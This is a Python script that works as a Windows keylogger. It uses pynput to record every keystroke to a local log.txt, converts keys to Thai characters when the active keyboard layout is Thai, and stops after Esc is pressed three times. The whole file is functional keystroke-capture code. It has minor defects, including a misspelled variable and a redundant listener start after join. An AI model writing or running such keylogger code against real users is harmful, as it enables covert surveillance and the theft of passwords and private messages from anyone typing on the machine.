from pynput import keyboard
import ctypes
# Thai					0x041e
# English               0x409
# Mapping Key to Thai-char
key_map = {
    "1" : "ๅ",
    "2" : "/",
    "3" : "-",
    "4" : "ภ",
    "5" : "ถ",
    "6" : "ุ",
    "7" : "ึ",
    "8" : "ค",
    "9" : "ต",
    "0" : "จ",
    "-" : "ข",
    "=" : "ช",
    "q" : "ๆ",
    "w" : "ไ",
    "e" : "ำ",
    "r" : "พ",
    "t" : "ะ",
    "y" : "ั",
    "u" : "ี",
    "i" : "ร",
    "o" : "น",
    "p" : "ย",
    "[" : "บ",
    "]" : "ล",
    "\\" : "ฃ",
    "a" : "ฟ",
    "s" : "ห",
    "d" : "ก",
    "f" : "ด",
    "g" : "เ",
    "h" : "้้",
    "j" : "่",
    "k" : "า",
    "l" : "ส",
    ";" : "ว",
    "'" : "ง",
    "z" : "ผ",
    "x" : "ป",
    "c" : "แ",
    "v" : "อ",
    "b" : "ิ",
    "n" : "ื",
    "m" : "ท",
    "," : "ม",
    "." : "ใ",
    "/" : "ฝ",
    # Shift
    "!" : "+",
    "@" : "๑",
    "#" : "๒",
    "$" : "๓",
    "%" : "๔",
    "^" : "ู",
    "&" : "฿",
    "*" : "๕",
    "(" : "๖",
    ")" : "๗",
    "_" : "๘",
    "+" : "๙",
    "Q" : "๐",
    "W" : "\"",
    "E" : "ฎ",
    "R" : "ฑ",
    "T" : "ธ",
    "Y" : "ํ",
    "U" : "๊",
    "I" : "ณ",
    "O" : "ฯ",
    "P" : "ญ",
    "{" : "ฐ",
    "}" : ",",
    "|" : "ฅ",
    "A" : "ฤ",
    "S" : "ฆ",
    "D" : "ฏ",
    "F" : "โ",
    "G" : "ฌ",
    "H" : "็",
    "J" : "๋",
    "K" : "ษ",
    "L" : "ศ",
    ":" : "ซ",
    "\"" : ".",
    "Z" : "(",
    "X" : ")",
    "C" : "ฉ",
    "V" : "ฮ",
    "B" : "ฺ",
    "N" : "์",
    "M" : "?",
    "<" : "ฒ",
    ">" : "ฬ",
    "?" : "ฦ",
    " " : " "
}

def key_lang_check():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2**16 - 1)
    lid_hex = hex(lid)
    return lid_hex

esc_count = 0

def on_press(key):
    try:
        with open('log.txt', 'a', encoding='utf-8') as file:
            if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                t = '{}'.format((int(key.vk)-96))
            else:
                t = '{}'.format(key.char)
            if key_lang_check() == '0x41e':
                file.write(key_map[t])
            else:
                file.write(t)
    except AttributeError:
        if key == keyboard.Key.enter or key == keyboard.Key.tab:
            with open('log.txt', 'a', encoding='utf-8') as file:
                file.write('\n')

def on_release(key):
    global esc_count
    # Press ESC 3 time to quit
    if key == keyboard.Key.esc:
        esc_count += 1
    if esc_count >= 3:
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

listenter = keyboard.Listener(on_press=on_press, on_release=on_release)

listener.start()